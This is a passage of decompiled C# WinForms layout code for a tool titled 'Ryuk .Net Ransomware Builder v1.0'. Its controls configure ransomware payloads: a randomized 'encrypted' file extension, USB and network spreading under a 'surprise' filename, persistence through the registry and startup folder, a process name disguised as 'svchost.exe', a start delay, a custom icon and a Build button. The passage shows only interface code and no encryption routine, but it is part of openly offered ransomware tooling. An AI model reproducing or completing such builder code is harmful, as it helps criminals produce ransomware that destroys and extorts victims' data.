		((Control)TopBorderPanel).Location = new Point(20, 0);
		((Control)TopBorderPanel).Name = "TopBorderPanel";
		((Control)TopBorderPanel).Size = new Size(807, 2);
		((Control)TopBorderPanel).TabIndex = 0;
		((Control)TopBorderPanel).MouseDown += new MouseEventHandler(TopBorderPanel_MouseDown);
		((Control)TopBorderPanel).MouseMove += new MouseEventHandler(TopBorderPanel_MouseMove);
		((Control)TopBorderPanel).MouseUp += new MouseEventHandler(TopBorderPanel_MouseUp);
		((Control)RightPanel).Anchor = (AnchorStyles)11;
		((Control)RightPanel).BackColor = Color.Black;
		((Control)RightPanel).Cursor = Cursors.SizeWE;
		((Control)RightPanel).Location = new Point(845, 22);
		((Control)RightPanel).Name = "RightPanel";
		((Control)RightPanel).Size = new Size(2, 501);
		((Control)RightPanel).TabIndex = 1;
		((Control)RightPanel).MouseDown += new MouseEventHandler(RightPanel_MouseDown);
		((Control)RightPanel).MouseMove += new MouseEventHandler(RightPanel_MouseMove);
		((Control)RightPanel).MouseUp += new MouseEventHandler(RightPanel_MouseUp);
		((Control)LeftPanel).Anchor = (AnchorStyles)7;
		((Control)LeftPanel).BackColor = Color.Black;
		((Control)LeftPanel).Cursor = Cursors.SizeWE;
		((Control)LeftPanel).Location = new Point(0, 20);
		((Control)LeftPanel).Name = "LeftPanel";
		((Control)LeftPanel).Size = new Size(2, 501);
		((Control)LeftPanel).TabIndex = 2;
		((Control)LeftPanel).MouseDown += new MouseEventHandler(LeftPanel_MouseDown);
		((Control)LeftPanel).MouseMove += new MouseEventHandler(LeftPanel_MouseMove);
		((Control)LeftPanel).MouseUp += new MouseEventHandler(LeftPanel_MouseUp);
		((Control)BottomPanel).Anchor = (AnchorStyles)14;
		((Control)BottomPanel).BackColor = Color.Black;
		((Control)BottomPanel).Cursor = Cursors.SizeNS;
		((Control)BottomPanel).Location = new Point(15, 542);
		((Control)BottomPanel).Name = "BottomPanel";
		((Control)BottomPanel).Size = new Size(809, 2);
		((Control)BottomPanel).TabIndex = 3;
		((Control)BottomPanel).MouseDown += new MouseEventHandler(BottomPanel_MouseDown);
		((Control)BottomPanel).MouseMove += new MouseEventHandler(BottomPanel_MouseMove);
		((Control)BottomPanel).MouseUp += new MouseEventHandler(BottomPanel_MouseUp);
		((Control)TopPanel).BackColor = Color.FromArgb(30, 30, 30);
		((Control)TopPanel).Controls.Add((Control)(object)_MinButton);
		((Control)TopPanel).Controls.Add((Control)(object)_MaxButton);
		((Control)TopPanel).Controls.Add((Control)(object)WindowTextLabel);
		((Control)TopPanel).Controls.Add((Control)(object)_CloseButton);
		((Control)TopPanel).Dock = (DockStyle)1;
		((Control)TopPanel).Location = new Point(0, 0);
		((Control)TopPanel).Name = "TopPanel";
		((Control)TopPanel).Size = new Size(847, 76);
		((Control)TopPanel).TabIndex = 4;
		((Control)TopPanel).MouseDown += new MouseEventHandler(TopPanel_MouseDown);
		((Control)TopPanel).MouseMove += new MouseEventHandler(TopPanel_MouseMove);
		((Control)TopPanel).MouseUp += new MouseEventHandler(TopPanel_MouseUp);
		((Control)_MinButton).Anchor = (AnchorStyles)9;
		_MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MinButton.DisplayText = "_";
		((ButtonBase)_MinButton).FlatStyle = (FlatStyle)0;
		((Control)_MinButton).Font = new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_MinButton).ForeColor = Color.White;
		((Control)_MinButton).Location = new Point(749, 6);
		_MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MinButton).Name = "_MinButton";
		((Control)_MinButton).Size = new Size(31, 24);
		((Control)_MinButton).TabIndex = 4;
		((Control)_MinButton).Text = "_";
		_MinButton.TextLocation_X = 6;
		_MinButton.TextLocation_Y = -20;
		((ButtonBase)_MinButton).UseVisualStyleBackColor = true;
		((Control)_MinButton).Click += _MinButton_Click;
		((Control)_MaxButton).Anchor = (AnchorStyles)9;
		_MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
		_MaxButton.DisplayText = "_";
		((ButtonBase)_MaxButton).FlatStyle = (FlatStyle)0;
		((Control)_MaxButton).ForeColor = Color.White;
		((Control)_MaxButton).Location = new Point(780, 6);
		_MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MaxButton).Name = "_MaxButton";
		((Control)_MaxButton).Size = new Size(31, 24);
		((Control)_MaxButton).TabIndex = 2;
		((Control)_MaxButton).Text = "minMaxButton1";
		_MaxButton.TextLocation_X = 8;
		_MaxButton.TextLocation_Y = 6;
		((ButtonBase)_MaxButton).UseVisualStyleBackColor = true;
		((Control)_MaxButton).Click += _MaxButton_Click;
		((Control)WindowTextLabel).AutoSize = true;
		((Control)WindowTextLabel).Font = new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)WindowTextLabel).ForeColor = Color.White;
		((Control)WindowTextLabel).Location = new Point(8, 22);
		((Control)WindowTextLabel).Name = "WindowTextLabel";
		((Control)WindowTextLabel).Size = new Size(576, 39);
		((Control)WindowTextLabel).TabIndex = 1;
		((Control)WindowTextLabel).Text = "Ryuk .Net Ransomware Builder v1.0";
		((Control)WindowTextLabel).MouseDown += new MouseEventHandler(WindowTextLabel_MouseDown);
		((Control)WindowTextLabel).MouseMove += new MouseEventHandler(WindowTextLabel_MouseMove);
		((Control)WindowTextLabel).MouseUp += new MouseEventHandler(WindowTextLabel_MouseUp);
		((Control)_CloseButton).Anchor = (AnchorStyles)9;
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).FlatStyle = (FlatStyle)0;
		((Control)_CloseButton).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_CloseButton).ForeColor = Color.White;
		((Control)_CloseButton).Location = new Point(811, 6);
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).Name = "_CloseButton";
		((Control)_CloseButton).Size = new Size(31, 24);
		((Control)_CloseButton).TabIndex = 0;
		((Control)_CloseButton).Text = "X";
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).UseVisualStyleBackColor = true;
		((Control)_CloseButton).Click += _CloseButton_Click;
		((Control)RightBottomPanel_1).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_1).BackColor = Color.Black;
		((Control)RightBottomPanel_1).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_1).Location = new Point(827, 542);
		((Control)RightBottomPanel_1).Name = "RightBottomPanel_1";
		((Control)RightBottomPanel_1).Size = new Size(19, 2);
		((Control)RightBottomPanel_1).TabIndex = 5;
		((Control)RightBottomPanel_1).MouseDown += new MouseEventHandler(RightBottomPanel_1_MouseDown);
		((Control)RightBottomPanel_1).MouseMove += new MouseEventHandler(RightBottomPanel_1_MouseMove);
		((Control)RightBottomPanel_1).MouseUp += new MouseEventHandler(RightBottomPanel_1_MouseUp);
		((Control)panel2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)panel2).Controls.Add((Control)(object)sleepCheckBox);
		((Control)panel2).Controls.Add((Control)(object)SleepTextBox);
		((Control)panel2).Controls.Add((Control)(object)selectIconLabel);
		((Control)panel2).Controls.Add((Control)(object)pictureBox1);
		((Control)panel2).Controls.Add((Control)(object)registryStartupcheckBox);
		((Control)panel2).Controls.Add((Control)(object)startupcheckBox3);
		((Control)panel2).Controls.Add((Control)(object)textBox4);
		((Control)panel2).Controls.Add((Control)(object)checkBox2);
		((Control)panel2).Controls.Add((Control)(object)spreadNameText);
		((Control)panel2).Controls.Add((Control)(object)checkBox1);
		((Control)panel2).Controls.Add((Control)(object)textBox2);
		((Control)panel2).Controls.Add((Control)(object)usbSpreadCheckBox);
		((Control)panel2).Controls.Add((Control)(object)shapedButton4);
		((Control)panel2).Controls.Add((Control)(object)shapedButton3);
		((Control)panel2).Dock = (DockStyle)2;
		((Control)panel2).ForeColor = SystemColors.Control;
		((Control)panel2).Location = new Point(0, 423);
		((Control)panel2).Name = "panel2";
		((Control)panel2).Size = new Size(847, 121);
		((Control)panel2).TabIndex = 8;
		((Control)panel2).Paint += new PaintEventHandler(panel2_Paint);
		((Control)sleepCheckBox).Anchor = (AnchorStyles)9;
		((Control)sleepCheckBox).AutoSize = true;
		((Control)sleepCheckBox).Cursor = Cursors.Hand;
		((Control)sleepCheckBox).Location = new Point(421, 49);
		((Control)sleepCheckBox).Name = "sleepCheckBox";
		((Control)sleepCheckBox).Size = new Size(91, 17);
		((Control)sleepCheckBox).TabIndex = 22;
		((Control)sleepCheckBox).Text = "Delay second";
		((ButtonBase)sleepCheckBox).UseVisualStyleBackColor = true;
		sleepCheckBox.CheckedChanged += checkBox3_CheckedChanged;
		((Control)SleepTextBox).Anchor = (AnchorStyles)9;
		((Control)SleepTextBox).BackColor = Color.FromArgb(30, 30, 30);
		((Control)SleepTextBox).Enabled = false;
		((Control)SleepTextBox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)SleepTextBox).ForeColor = SystemColors.Window;
		((Control)SleepTextBox).Location = new Point(421, 83);
		((Control)SleepTextBox).Name = "SleepTextBox";
		((Control)SleepTextBox).Size = new Size(91, 22);
		((Control)SleepTextBox).TabIndex = 21;
		((Control)SleepTextBox).Text = "10";
		SleepTextBox.TextAlign = (HorizontalAlignment)2;
		((Control)SleepTextBox).KeyPress += new KeyPressEventHandler(SleepTextBox_KeyPress_1);
		((Control)selectIconLabel).Anchor = (AnchorStyles)9;
		((Control)selectIconLabel).AutoSize = true;
		((Control)selectIconLabel).Cursor = Cursors.Hand;
		((Control)selectIconLabel).Location = new Point(571, 70);
		((Control)selectIconLabel).Name = "selectIconLabel";
		((Control)selectIconLabel).Size = new Size(61, 13);
		((Control)selectIconLabel).TabIndex = 20;
		((Control)selectIconLabel).Text = "Select Icon";
		((Control)selectIconLabel).Click += selectIconLabel_Click;
		((Control)pictureBox1).Anchor = (AnchorStyles)9;
		pictureBox1.BorderStyle = (BorderStyle)1;
		((Control)pictureBox1).Cursor = Cursors.Hand;
		((Control)pictureBox1).Location = new Point(556, 44);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(89, 69);
		pictureBox1.SizeMode = (PictureBoxSizeMode)3;
		pictureBox1.TabIndex = 18;
		pictureBox1.TabStop = false;
		((Control)pictureBox1).Click += pictureBox1_Click;
		((Control)registryStartupcheckBox).AutoSize = true;
		registryStartupcheckBox.Checked = true;
		registryStartupcheckBox.CheckState = (CheckState)1;
		((Control)registryStartupcheckBox).Cursor = Cursors.Hand;
		((Control)registryStartupcheckBox).Location = new Point(181, 83);
		((Control)registryStartupcheckBox).Name = "registryStartupcheckBox";
		((Control)registryStartupcheckBox).Size = new Size(130, 17);
		((Control)registryStartupcheckBox).TabIndex = 16;
		((Control)registryStartupcheckBox).Text = "Add to registry Startup";
		((ButtonBase)registryStartupcheckBox).UseVisualStyleBackColor = true;
		((Control)startupcheckBox3).AutoSize = true;
		startupcheckBox3.Checked = true;
		startupcheckBox3.CheckState = (CheckState)1;
		((Control)startupcheckBox3).Cursor = Cursors.Hand;
		((Control)startupcheckBox3).Location = new Point(32, 83);
		((Control)startupcheckBox3).Name = "startupcheckBox3";
		((Control)startupcheckBox3).Size = new Size(121, 17);
		((Control)startupcheckBox3).TabIndex = 15;
		((Control)startupcheckBox3).Text = "Add to startup folder";
		((ButtonBase)startupcheckBox3).UseVisualStyleBackColor = true;
		((Control)textBox4).Anchor = (AnchorStyles)9;
		((Control)textBox4).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox4).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox4).ForeColor = SystemColors.Window;
		((Control)textBox4).Location = new Point(528, 10);
		((Control)textBox4).Name = "textBox4";
		((Control)textBox4).Size = new Size(117, 22);
		((Control)textBox4).TabIndex = 14;
		((Control)textBox4).Text = "svchost.exe";
		textBox4.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox2).Anchor = (AnchorStyles)9;
		((Control)checkBox2).AutoSize = true;
		checkBox2.Checked = true;
		checkBox2.CheckState = (CheckState)1;
		((Control)checkBox2).Cursor = Cursors.Hand;
		((Control)checkBox2).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)checkBox2).Location = new Point(421, 14);
		((Control)checkBox2).Name = "checkBox2";
		((Control)checkBox2).Size = new Size(101, 17);
		((Control)checkBox2).TabIndex = 13;
		((Control)checkBox2).Text = "Proccess Name";
		((ButtonBase)checkBox2).UseVisualStyleBackColor = true;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged;
		((Control)spreadNameText).BackColor = Color.FromArgb(30, 30, 30);
		((Control)spreadNameText).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)spreadNameText).ForeColor = SystemColors.Window;
		((Control)spreadNameText).Location = new Point(181, 44);
		((Control)spreadNameText).Name = "spreadNameText";
		((Control)spreadNameText).Size = new Size(143, 22);
		((Control)spreadNameText).TabIndex = 12;
		((Control)spreadNameText).Text = "surprise";
		spreadNameText.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox1).AutoSize = true;
		checkBox1.Checked = true;
		checkBox1.CheckState = (CheckState)1;
		((Control)checkBox1).Cursor = Cursors.Hand;
		((Control)checkBox1).Location = new Point(32, 10);
		((Control)checkBox1).Name = "checkBox1";
		((Control)checkBox1).Size = new Size(143, 17);
		((Control)checkBox1).TabIndex = 11;
		((Control)checkBox1).Text = "Randomize file extension";
		((ButtonBase)checkBox1).UseVisualStyleBackColor = true;
		checkBox1.CheckedChanged += checkBox1_CheckedChanged;
		((Control)textBox2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox2).Enabled = false;
		((Control)textBox2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox2).ForeColor = SystemColors.Window;
		((Control)textBox2).Location = new Point(181, 8);
		((Control)textBox2).Name = "textBox2";
		((Control)textBox2).Size = new Size(143, 22);
		((Control)textBox2).TabIndex = 10;
		((Control)textBox2).Text = "encrypted";
		textBox2.TextAlign = (HorizontalAlignment)2;
		((Control)usbSpreadCheckBox).AutoSize = true;
		usbSpreadCheckBox.Checked = true;
		usbSpreadCheckBox.CheckState = (CheckState)1;
		((Control)usbSpreadCheckBox).Cursor = Cursors.Hand;
		((Control)usbSpreadCheckBox).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)usbSpreadCheckBox).Location = new Point(32, 48);
		((Control)usbSpreadCheckBox).Name = "usbSpreadCheckBox";
		((Control)usbSpreadCheckBox).Size = new Size(142, 17);
		((Control)usbSpreadCheckBox).TabIndex = 9;
		((Control)usbSpreadCheckBox).Text = "Usb and network spread";
		((ButtonBase)usbSpreadCheckBox).UseVisualStyleBackColor = true;
		usbSpreadCheckBox.CheckedChanged += usbSpreadCheckBox_CheckedChanged;
		((Control)shapedButton4).Anchor = (AnchorStyles)9;
		((Control)shapedButton4).BackColor = Color.Transparent;
		shapedButton4.BorderColor = Color.Transparent;
		shapedButton4.BorderWidth = 2;
		shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton4.ButtonText = "Build ";
		((Control)shapedButton4).Cursor = Cursors.Hand;
		shapedButton4.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton4).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton4).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton4).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton4).FlatStyle = (FlatStyle)0;
		((Control)shapedButton4).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton4).ForeColor = Color.White;
		shapedButton4.GradientAngle = 90;
		((Control)shapedButton4).Location = new Point(691, 58);
		shapedButton4.MouseClickColor1 = Color.Black;
		shapedButton4.MouseClickColor2 = Color.Black;
		shapedButton4.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton4.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton4).Name = "shapedButton4";
		shapedButton4.ShowButtontext = true;
		((Control)shapedButton4).Size = new Size(136, 55);
		shapedButton4.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton4).TabIndex = 8;
		shapedButton4.TextLocation_X = 46;
		shapedButton4.TextLocation_Y = 18;
		shapedButton4.Transparent1 = 250;
		shapedButton4.Transparent2 = 250;
		((ButtonBase)shapedButton4).UseVisualStyleBackColor = false;
		((Control)shapedButton4).Click += shapedButton4_Click;
		((Control)shapedButton3).Anchor = (AnchorStyles)9;
		((Control)shapedButton3).BackColor = Color.Transparent;
		shapedButton3.BorderColor = Color.Transparent;
		shapedButton3.BorderWidth = 2;
		shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton3.ButtonText = "About";
		((Control)shapedButton3).Cursor = Cursors.Hand;
		shapedButton3.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton3).FlatAppearance.BorderSize = 0;
		((ButtonBase)shapedButton3).FlatAppearance.MouseDownBackColor = Color.Transparent;
		((ButtonBase)shapedButton3).FlatAppearance.MouseOverBackColor = Color.Transparent;
		((ButtonBase)shapedButton3).FlatStyle = (FlatStyle)0;
		((Control)shapedButton3).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)shapedButton3).ForeColor = Color.White;
		shapedButton3.GradientAngle = 90;
		((Control)shapedButton3).Location = new Point(691, 3);
		shapedButton3.MouseClickColor1 = Color.Black;
		shapedButton3.MouseClickColor2 = Color.Black;
		shapedButton3.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton3.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton3).Name = "shapedButton3";
		shapedButton3.ShowButtontext = true;
		((Control)shapedButton3).Size = new Size(136, 55);
		shapedButton3.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton3).TabIndex = 7;
		shapedButton3.TextLocation_X = 45;
		shapedButton3.TextLocation_Y = 18;
		shapedButton3.Transparent1 = 250;
		shapedButton3.Transparent2 = 250;
		((ButtonBase)shapedButton3).UseVisualStyleBackColor = false;
		((Control)shapedButton3).Click += shapedButton3_Click;
		((Control)RightBottomPanel_2).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_2).BackColor = Color.Black;
		((Control)RightBottomPanel_2).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_2).Location = new Point(845, 523);
		((Control)RightBottomPanel_2).Name = "RightBottomPanel_2";
		((Control)RightBottomPanel_2).Size = new Size(2, 19);
		((Control)RightBottomPanel_2).TabIndex = 9;
		((Control)RightBottomPanel_2).MouseDown += new MouseEventHandler(RightBottomPanel_2_MouseDown);
		((Control)RightBottomPanel_2).MouseMove += new MouseEventHandler(RightBottomPanel_2_MouseMove);
		((Control)RightBottomPanel_2).MouseUp += new MouseEventHandler(RightBottomPanel_2_MouseUp);
		((Control)LeftBottomPanel_1).Anchor = (AnchorStyles)6;
		((Control)LeftBottomPanel_1).BackColor = Color.Black;
		((Control)LeftBottomPanel_1).Cursor = Cursors.SizeNESW;
		((Control)LeftBottomPanel_1).Location = new Point(0, 542);
		((Control)LeftBottomPanel_1).Name = "LeftBottomPanel_1";
		((Control)LeftBottomPanel_1).Size = new Size(15, 2);
		((Control)LeftBottomPanel_1).TabIndex = 10;
		((Control)LeftBottomPanel_1).MouseDown += new MouseEventHandler(LeftBottomPanel_1_MouseDown);
		((Control)LeftBottomPanel_1).MouseMove += new MouseEventHandler(LeftBottomPanel_1_MouseMove);
		((Control)LeftBottomPanel_1).MouseUp += new MouseEventHandler(LeftBottomPanel_1_MouseUp);
		((Control)LeftBottomPanel_2).Anchor = (AnchorStyles)6;
		((Control)LeftBottomPanel_2).BackColor = Color.Black;
		((Control)LeftBottomPanel_2).Cursor = Cursors.SizeNESW;
		((Control)LeftBottomPanel_2).Location = new Point(0, 524);
		((Control)LeftBottomPanel_2).Name = "LeftBottomPanel_2";
		((Control)LeftBottomPanel_2).Size = new Size(2, 19);
		((Control)LeftBottomPanel_2).TabIndex = 11;
		((Control)LeftBottomPanel_2).MouseDown += new MouseEventHandler(LeftBottomPanel_2_MouseDown);
		((Control)LeftBottomPanel_2).MouseMove += new MouseEventHandler(LeftBottomPanel_2_MouseMove);
		((Control)LeftBottomPanel_2).MouseUp += new MouseEventHandler(LeftBottomPanel_2_MouseUp);
		((Control)RightTopPanel_1).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_1).BackColor = Color.Black;
		((Control)RightTopPanel_1).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_1).Location = new Point(845, 2);
		((Control)RightTopPanel_1).Name = "RightTopPanel_1";
		((Control)RightTopPanel_1).Size = new Size(2, 20);
		((Control)RightTopPanel_1).TabIndex = 12;
		((Control)RightTopPanel_1).MouseDown += new MouseEventHandler(RightTopPanel_1_MouseDown);
		((Control)RightTopPanel_1).MouseMove += new MouseEventHandler(RightTopPanel_1_MouseMove);
		((Control)RightTopPanel_1).MouseUp += new MouseEventHandler(RightTopPanel_1_MouseUp);
		((Control)RightTopPanel_2).Anchor = (AnchorStyles)9;
		((Control)RightTopPanel_2).BackColor = Color.Black;
		((Control)RightTopPanel_2).Cursor = Cursors.SizeNESW;
		((Control)RightTopPanel_2).Location = new Point(827, 0);
		((Control)RightTopPanel_2).Name = "RightTopPanel_2";
		((Control)RightTopPanel_2).Size = new Size(20, 2);
		((Control)RightTopPanel_2).TabIndex = 13;
		((Control)RightTopPanel_2).MouseDown += new MouseEventHandler(RightTopPanel_2_MouseDown);
		((Control)RightTopPanel_2).MouseMove += new MouseEventHandler(RightTopPanel_2_MouseMove);
		((Control)RightTopPanel_2).MouseUp += new MouseEventHandler(RightTopPanel_2_MouseUp);
		((Control)LeftTopPanel_1).BackColor = Color.Black;
		((Control)LeftTopPanel_1).Cursor = Cursors.SizeNWSE;
		((Control)LeftTopPanel_1).Location = new Point(0, 0);
		((Control)LeftTopPanel_1).Name = "LeftTopPanel_1";
		((Control)LeftTopPanel_1).Size = new Size(20, 2);
		((Control)LeftTopPanel_1).TabIndex = 14;
		((Control)LeftTopPanel_1).MouseDown += new MouseEventHandler(LeftTopPanel_1_MouseDown);
		((Control)LeftTopPanel_1).MouseMove += new MouseEventHandler(LeftTopPanel_1_MouseMove);
		((Control)LeftTopPanel_1).MouseUp += new MouseEventHandler(LeftTopPanel_1_MouseUp);
		((Control)LeftTopPanel_2).BackColor = Color.Black;
		((Control)LeftTopPanel_2).Cursor = Cursors.SizeNWSE;
		((Control)LeftTopPanel_2).Location = new Point(0, 0);
		((Control)LeftTopPanel_2).Name = "LeftTopPanel_2";
		((Control)LeftTopPanel_2).Size = new Size(2, 20);
		((Control)LeftTopPanel_2).TabIndex = 15;
		((Control)LeftTopPanel_2).MouseDown += new MouseEventHandler(LeftTopPanel_2_MouseDown);
		((Control)LeftTopPanel_2).MouseMove += new MouseEventHandler(LeftTopPanel_2_MouseMove);
		((Control)LeftTopPanel_2).MouseUp += new MouseEventHandler(LeftTopPanel_2_MouseUp);
		((Control)textBox1).Anchor = (AnchorStyles)15;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((TextBoxBase)textBox1).BorderStyle = (BorderStyle)0;
		((Control)textBox1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)textBox1).ForeColor = SystemColors.Window;
		((Control)textBox1).Location = new Point(12, 81);
		((TextBoxBase)textBox1).Multiline = true;
		((Control)textBox1).Name = "textBox1";
		textBox1.ScrollBars = (ScrollBars)2;
		((Control)textBox1).Size = new Size(827, 336);
		((Control)textBox1).TabIndex = 18;
		((Control)textBox1).Text = componentResourceManager.GetString("textBox1.Text");
		((FileDialog)saveFileDialog1).FileOk += saveFileDialog1_FileOk;
		((FileDialog)openFileDialog1).FileName = "openFileDialog1";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((ScrollableControl)this).AutoScroll = true;
		((Control)this).BackColor = Color.FromArgb(30, 30, 30);
		((Form)this).ClientSize = new Size(847, 544);
		((Control)this).Controls.Add((Control)(object)textBox1);
		((Control)this).Controls.Add((Control)(object)LeftTopPanel_2);
		((Control)this).Controls.Add((Control)(object)LeftTopPanel_1);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_2);
		((Control)this).Controls.Add((Control)(object)RightTopPanel_1);
		((Control)this).Controls.Add((Control)(object)LeftBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)LeftBottomPanel_1);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_2);
		((Control)this).Controls.Add((Control)(object)RightBottomPanel_1);
		((Control)this).Controls.Add((Control)(object)BottomPanel);
		((Control)this).Controls.Add((Control)(object)LeftPanel);
		((Control)this).Controls.Add((Control)(object)RightPanel);
		((Control)this).Controls.Add((Control)(object)TopBorderPanel);
		((Control)this).Controls.Add((Control)(object)TopPanel);
		((Control)this).Controls.Add((Control)(object)panel2);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Control)this).MinimumSize = new Size(847, 544);
		((Control)this).Name = "BlackForm";
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "Ryuk Ransomware";
		((Form)this).Load += BlackForm_Load;
		((Control)TopPanel).ResumeLayout(false);
		((Control)TopPanel).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
